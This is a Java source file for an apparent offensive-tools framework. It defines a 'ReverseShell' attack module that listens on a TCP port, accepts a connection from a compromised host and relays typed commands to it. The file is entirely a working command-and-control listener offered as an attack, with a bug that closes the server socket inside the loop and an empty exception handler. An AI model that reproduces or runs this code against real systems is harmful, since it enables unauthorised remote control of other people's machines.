package github.elijahbare.attack.attacks.reverse_shell;

import github.elijahbare.attack.Attack;
import github.elijahbare.attack.AttackType;
import github.elijahbare.attack.DefineAttack;
import github.elijahbare.setting.Setting;

import java.net.*;
import java.io.*;
import java.util.Scanner;

/**
 * @author Elijah Bare
 * @since 3/22/23
 */

@DefineAttack(name = "ReverseShell", attackType = AttackType.LOCAL_NETWORK)
public class ReverseShell implements Attack {

    public static Setting<Integer> port = new Setting<>("Port", 5555);

    public static ServerSocket server;
    public static Socket client;

    public static OutputStream output;
    public static InputStream input;

    @Override
    public String run(String[] args) {


        Thread guiThead = new Thread(ReverseShellGUI::new);
        guiThead.start();

        try {
            server = new ServerSocket(port.getValue().intValue());
            System.out.println("Server started on port " + port.getValue().intValue());
            client = server.accept();
            System.out.println("Client connected from " + client.getInetAddress().getHostAddress());
            input = client.getInputStream();
            output = client.getOutputStream();
            Scanner scanner = new Scanner(System.in);
            while (true) {
                System.out.print("Enter command: ");
                String command = scanner.nextLine();
                output.write(command.getBytes());
                byte[] buffer = new byte[1024];
                int bytesRead = input.read(buffer);
                System.out.println(new String(buffer, 0, bytesRead));
                if (command.trim().equals("exit")) {
                    break;
                }
                server.close();
            }
        } catch (
                IOException e) {
            //cope for now TODO
        }


        return "Completed Reverse Shell session";
    }
}
